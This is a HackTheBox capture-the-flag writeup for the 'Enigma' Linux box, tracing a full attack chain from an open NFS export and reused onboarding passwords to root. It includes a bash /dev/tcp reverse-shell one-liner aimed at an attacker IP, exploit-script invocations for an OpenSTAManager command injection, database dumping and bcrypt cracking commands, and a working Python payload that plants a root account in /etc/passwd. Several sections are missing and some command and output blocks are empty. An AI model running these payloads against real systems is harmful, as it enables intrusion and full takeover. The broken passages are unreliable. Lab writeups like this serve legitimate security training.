# HackTheBox: Enigma — Writeup

**Difficulty (listed):** Easy
**Difficulty (actual):** Medium, particularly during privilege escalation
**OS:** Linux
**Status:** Fully rooted (user + root)

---

## Overview

Enigma is rated "Easy" on HackTheBox, but the path to root requires chaining together credential reuse across two mailboxes, exploiting an unauthenticated command injection vulnerability whose public PoC does not work out of the box, cracking a bcrypt hash, and reverse-engineering a minified JavaScript bundle to identify an undocumented API parameter. This writeup documents the full attack chain from initial reconnaissance to root.

## 1. Reconnaissance

An initial `nmap` scan revealed the following open ports:

| Port | Service |
|------|---------|
| 22   | SSH |
| 80   | HTTP |
| 110  | POP3 |
| 111  | RPCBind |
| 143  | IMAP |
| 993  | IMAPS |
| 995  | POP3S |
| 2049 | NFS |

The presence of multiple mail-related ports alongside RPCBind and an exposed NFS service suggested this box would require lateral movement through mail infrastructure rather than a single web application vulnerability. The root HTTP page at `http://enigma.htb/` returned a static landing page with no actionable content, indicating that the real application(s) were hosted on unannounced virtual hosts.

---

## 2. NFS Enumeration

```bash
showmount -e 10.129.239.191
```

```
Export list for 10.129.239.191:
/srv/nfs/onboarding *
```

The wildcard (`*`) indicates the export has no client restriction — any host can mount it without authentication.

```bash
mkdir -p /mnt/onboarding
mount -t nfs 10.129.239.191:/srv/nfs/onboarding /mnt/onboarding -o nolock
ls -la /mnt/onboarding
```

The share contained a single file, `New_Employee_Access.pdf`, which referenced two employees:

- **Kevin Mitchell** — Operations, new hire
- **Sarah** — Accounts / HR

This document served as the initial pivot point for the credential-reuse chain that follows.

---

## 3. Mailbox Access via Roundcube

The PDF referenced `mail001.enigma.htb`, which was added to `/etc/hosts` along with the other discovered hostnames:

```
10.129.239.191  enigma.htb mail001.enigma.htb support_001.enigma.htb
```

`http://mail001.enigma.htb` hosted a Roundcube webmail login. Given that Kevin was a newly onboarded employee, it was reasonable to assume his account might still be using an autogenerated onboarding password. Testing `Enigma2024!` against his account succeeded.

Kevin's inbox contained a single welcome email from `sarah@enigma.htb`, with no further useful content on its own. However, this raised the question of whether the onboarding system generates the same "random" password for every new employee, or reuses a predictable seed. Testing the identical password against Sarah's account (`sarah@enigma.htb`) succeeded as well — confirming a systemic password-generation flaw in the onboarding process rather than a one-off weak password.

---

## 4. Virtual Host Discovery

With the primary host unproductive, virtual host fuzzing was performed:

```bash
ffuf -u http://10.129.239.191 -H "Host: FUZZ.enigma.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 0
```

This uncovered `support_001.enigma.htb`, hosting **OpenSTAManager 2.9.8**, a business management application. This version is affected by **CVE-2025-69212**, an OS command injection vulnerability in the P7M invoice-import functionality.

## 5. Privilege Escalation to Admin (Application Level)

Returning to Sarah's mailbox (accessed via the reused onboarding password), a message was found containing administrative credentials for the OpenSTAManager instance at `support_001`:

```
Username: admin
Password: Ne3s4rtars78s
```

These credentials authenticated successfully against `POST /?op=login`, granting full administrative access to the application (`/controller.php?id_module=1`).

**Chain so far:**

```
NFS export (no auth)
  └─ New_Employee_Access.pdf → Kevin Mitchell
       └─ Onboarding password (Enigma2024!) → Kevin's mailbox
            └─ Same password reused → Sarah's mailbox
                 └─ Admin credentials for support_001 found in email
                      └─ Administrative access to OpenSTAManager
```

## 6. CVE-2025-69212: OpenSTAManager RCE

The public proof-of-concept ([CVE-2025-69212-PoC](https://github.com/)) targets the `decodeP7M()` function via the ZIP invoice-import plugin. This vulnerability requires a valid **module ID** and **plugin ID**, both of which are instance-specific and not documented anywhere.

### Failed attempt — guessed IDs

```bash
python3 exploit.py \
  -t 'http://support_001.enigma.htb' \
  -u admin -p 'Ne3s4rtars78s' \
  --check --module-id 14 --plugin-id 21
```

Result: `Upload failed`. These IDs do not persist across installations, and guessing them (or copying values from an unrelated writeup) does not work.

### Correct approach — using the PoC's built-in discovery mode

```bash
python3 exploit.py \
  -t 'http://support_001.enigma.htb' \
  -u admin -p 'Ne3s4rtars78s' \
  --check
```

```
[+] Found 2 candidate(s).
├─ Module ID: 14
├─ Plugin ID: 21
...
[*] Switched to working module: 15/19
[+] Target is VULNERABLE!
```

The correct values for this target were `--module-id 15 --plugin-id 19`. This step underscores the importance of running an exploit's discovery/check mode rather than assuming parameters will transfer between installations.

## 7. Initial Shell as www-data

With a listener running:

```bash
nc -lvnp 4444
```

The RCE was triggered with the correct IDs:

```bash
python3 exploit.py \
  -t 'http://support_001.enigma.htb' \
  -u admin -p 'Ne3s4rtars78s' \
  --cmd 'bash -c "bash -i >& /dev/tcp/10.10.14.184/4444 0>&1"' \
  --module-id 15 --plugin-id 19
```

This returned a shell as `www-data`. The shell was immediately upgraded to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# press Enter twice
export TERM=xterm
export SHELL=/bin/bash
stty rows 50 cols 200
```

A proper TTY is required for subsequent steps (`su`, password prompts, and interactive tools will otherwise fail silently or hang).

## 8. Lateral Movement to haris

The application configuration file disclosed database credentials:

```bash
cat /var/www/html/openstamanager/config.inc.php
```

```
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

Dumping the application's user table:

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager \
  -e "SELECT id, username, email, password FROM zz_users;"
```

```
1  admin  admin@enigma.htb  $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
2  haris  haris@enigma.htb  $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

The `admin` hash corresponded to the already-known password, confirming password reuse at the database level as well. The `haris` hash was unknown and required cracking (bcrypt):

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt haris.hash
john --show --format=bcrypt haris.hash
```

Result: `bestfriends`

```bash
su - haris
# bestfriends
```

## 10. Root Cause Analysis: OliveTin

A local port scan as `haris` revealed:

```bash
ss -tulnp
```

```
LISTEN  0 4096  127.0.0.1:1337  0.0.0.0:*   users:(("OliveTin",pid=...))
```

**OliveTin** is a self-hosted web UI that exposes predefined shell commands as clickable actions. This instance was running as **root** and bound to localhost.

API enumeration showed that documentation for older OliveTin versions is outdated for the version installed here:

```
GET  /api/GetActions   → 404 (deprecated endpoint name)
GET  /api/actions      → 404
POST /api/WhoAmI       → 200, returns "guest"
POST /api/StartAction  → 405 on GET, accepts POST
```

Submitting a `StartAction` request using the parameter name documented for older versions (`actionId`) silently failed — the server returned a generic "action not found" response with no indication that the field itself was wrong. Inspecting the frontend's minified JavaScript bundle (`/assets/index-*.js`) revealed that the current version uses a renamed field: **`bindingId`**.

Confirming the vulnerable action:

```bash
curl -s -X POST http://127.0.0.1:1337/api/StartAction \
  -H "Content-Type: application/json" \
  --data-binary '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"root"},{"name":"db_pass","value":"x"},{"name":"db_name","value":"production"}]}'
```

```
{"executionTrackingId":"3393ee28-..."}
```

The execution log showed:

```
exit status 2
sh: 1: cannot /opt/backups/backup.sql: Directory nonexistent
```

This confirmed the binding executes a `mysqldump` command as root, with the `db_pass` argument templated unsafely into `-p'{{ db_pass }}'`. A single unescaped quote in the `db_pass` value breaks out of the shell string, allowing arbitrary command injection.

## 11. Exploiting the OliveTin Command Injection

### Initial attempt — defeated by shell variable expansion

```
db_pass = x; echo hacker:$1$xyz$... >> /etc/passwd #
```

The injected `$1`, `$xyz`, etc. were interpreted as shell variables and expanded to empty strings before `echo` executed, corrupting the intended password hash.

### Working payload — base64-encoded to avoid shell expansion

```python
import json, base64, urllib.request

line = 'pwn:$1$xyz$BsyKyb1qET4YoYqZL2pe./:0:0:root:/root:/bin/bash'
b64 = base64.b64encode(line.encode()).decode()
inject = "x'; echo %s | base64 -d >> /etc/passwd #" % b64

payload = {
    "bindingId": "backup_database",
    "arguments": [
        {"name": "db_user", "value": "root"},
        {"name": "db_pass", "value": inject},
        {"name": "db_name", "value": "production"}
    ]
}

req = urllib.request.Request(
    "http://127.0.0.1:1337/api/StartAction",
    data=json.dumps(payload).encode(),
    headers={"Content-Type": "application/json"}
)
print(urllib.request.urlopen(req).read().decode())
```

The MD5-crypt hash `$1$xyz$BsyKyb1qET4YoYqZL2pe./` corresponds to the plaintext `12345`.

> **Note:** An early version of this payload appended the new `/etc/passwd` entry without a preceding newline, which caused it to be silently concatenated onto the previous line rather than forming a new entry. Prefixing the injected content with a newline resolved this.

Verifying and escalating:

```bash
grep pwn /etc/passwd
```

```

```

```bash

# 12345
id
```

```

```

## 15. Key Takeaways

- **Unrestricted NFS exports leak more than files.** A wildcard export with no client allowlist exposed an internal HR document that seeded the entire credential-reuse chain.
- **Autogenerated passwords are only as strong as the generator.** If the same "random" password is produced for multiple employees, it functions as a static default credential.
- **Credential reuse compounds risk.** A single reused password unlocked two mailboxes and, transitively, an administrative application account.
- **Default virtual hosts can mask the real target.** The primary domain was a decoy; the functional application lived on an undocumented subdomain.
- **Public PoCs often require environment-specific parameters.** Always run an exploit's discovery/check mode rather than reusing IDs from unrelated writeups.
- **TTY upgrades are a prerequisite, not an optional nicety.** Several subsequent steps fail silently without one.
- **Internal automation tools running as root need the same scrutiny as public-facing applications.** OliveTin's unsanitized command templating turned a "convenience" feature into a root-level command injection.
- **Shell metacharacters in injected payloads require careful handling.** Unescaped `$` characters can be expanded by the shell before your payload executes; base64-encoding untrusted content sidesteps this.
